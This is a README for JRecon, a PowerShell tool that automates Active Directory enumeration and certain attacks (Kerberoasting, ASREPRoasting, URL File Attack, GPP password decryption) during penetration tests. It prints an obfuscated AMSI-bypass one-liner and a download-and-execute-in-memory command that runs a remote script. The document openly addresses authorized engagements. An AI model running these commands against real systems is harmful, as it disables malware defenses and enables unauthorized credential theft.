# JRecon
### A tool to automate Active Directory Enumeration
I've been working on this tool to automate a good part of the initial AD enumeration phase.

JRecon is not perfect, but it does it's job - while I can go grab a coffee

My advice is to run the tool within an empty working directory folder, and (if needed) re-run within the same folder. 

Why ? Because it uses some of the output it produces to perform other tasks.

No third-party tool is invoked from the internet, everything is embedded. Why ? Because we may have no access to internet or Github repositories during engagements, and tools may change syntax when updated which would brake JRecon. The only code that may significantly change in time is BloodHound collector, which I’ll try to keep updated.

JRecon will initially ask what tools you want to run. Why ? First of all to make sure you stay in scope, but also because it may not be the first time you run the tool. As a matter of fact, you may want to re-run some of the tasks as you move laterally within AD (e.g.: shares enumeration or BloodHound)

### What does the tool enumerate for ? Does it run any attack that I should be aware of ?

The only attacks it runs is Kerberoasting, ASREPRoasting, and URL File Attack. Everything else is just enumeration

JRecon will initially ask you if you want to download tools like Nessus, WinShareEnum, AdvIPScanner, HFS, VirtualBox, and Kali OS (these will actually be downloaded)

The tool enumerates for and performs (upon request):

•	AD objects and policies (subnets, computers, users, DCs, password policy and more)

•	Users Description field piping to file (excludes blank entries)

•	Creates a list of Servers

•	Creates a list of Hosts running Unsupported OS

•	Checks on Local Admins on the system

•	Checks if AV is installed

•	Checks for Local Admin Password Solution (LAPS)

•	Kerberoasting and ASREPRoasting

•	Checks for presence of Kerb Tickets in your local machine

•	Enumerates for Vulnerable GPOs

•	Checks for Misconfigured Certificate Templates

•	BloodHound collection

•	Checks for Exploitable Systems

•	Checks for LDAP Signing

•	Checks for Passwords in GPO (and decrypts them if it finds any)

•	Checks for Passwords in SYSVOL/Netlogon

•	Checks for Accessible shares (Read)

•	Checks for Writable shares (Write)

•	Asks you if you want to run a URL File Attack

### How to run ?

First bypass AMSI (example below)

```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

Set a variable to download your licensed version of PingCastle

(If you skip this step PingCastle Free Edition will be downloaded - Not for commercial use)

```
$jpingdownload = "<URL>"
```

You can set the variable "$jYesToAll" to "All" (before running the tool) to make it run without asking questions

This feature is probably best to use if you know the tool already, and you know it won't go out of scope

```
$jYesToAll = "All"
```

Finally, invoke and run the tool on memory (don't make it touch disk)

```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/JRecon/main/JRecon.ps1')
```

## JRecon is a collection of other scripts and tools

### Which tools are included?


**Rubeus**

Rubeus is a C# toolset for raw Kerberos interaction and abuses.

@Credit to: https://github.com/GhostPack/Rubeus && https://github.com/gentilkiwi/kekeo/
 

**Grouper3**

Find vulnerabilities in AD Group Policy, but do it better than Grouper2 did.

@Credit to: https://github.com/Group3r/Group3r
 

**Certify**

Active Directory certificate abuse. 

@Credit to: https://github.com/GhostPack/Certify


**LdapSignCheck**

C# project to check LDAP signing.

@Credit to: https://github.com/cube0x0/LdapSignCheck


**PingCastle** (Free Edition - **Not for commercial use**)

Get Active Directory Security at 80% in 20% of the time

@Credit to: https://github.com/vletoux/pingcastle


**SharpHound**

C# Data Collector for the BloodHound Project

@Credit to: https://github.com/BloodHoundAD/SharpHound


**ADRecon**

ADRecon is a tool which gathers information about the Active Directory

@Credit to: https://github.com/sense-of-security/ADRecon


**Invoke-Kerberoast**

Author: Will Schroeder (@harmj0y)

@Credit to: https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1


**PowerView**

Author: Will Schroeder (@harmj0y)

@Credit to: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1


**Invoke-ShareFinder**

Author: Will Schroeder (@harmj0y)

@Credit to: https://github.com/darkoperator/Veil-PowerView/blob/master/PowerView/functions/Invoke-ShareFinder.ps1


**AmsiScanBuffer bypass**

Author: Rasta Mouse (@_RastaMouse)

@Credit to: https://twitter.com/_RastaMouse


**Get-ExploitableSystems**

Author: Scott Sutherland (@_nullbind)

@Credit to: https://github.com/nullbind/Powershellery/blob/master/Stable-ish/ADS/Get-ExploitableSystems.psm1


**Get-GPPPassword**

Author: Chris Campbell (@obscuresec)

@Credit to: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1


**PowerSharpPack**

Author: Fabian (@ShitSecure)

@Credit to: https://github.com/S3cur3Th1sSh1t/PowerSharpPack

**Nessus**

https://www.tenable.com

**hfs2**

https://github.com/rejetto/hfs2/

**WinShareEnum**

https://github.com/nccgroup/WinShareEnum

**AdvancedIPScanner**

https://www.advanced-ip-scanner.com/

**VirtualBox**

https://www.virtualbox.org/

**Kali OS**

https://www.kali.org/
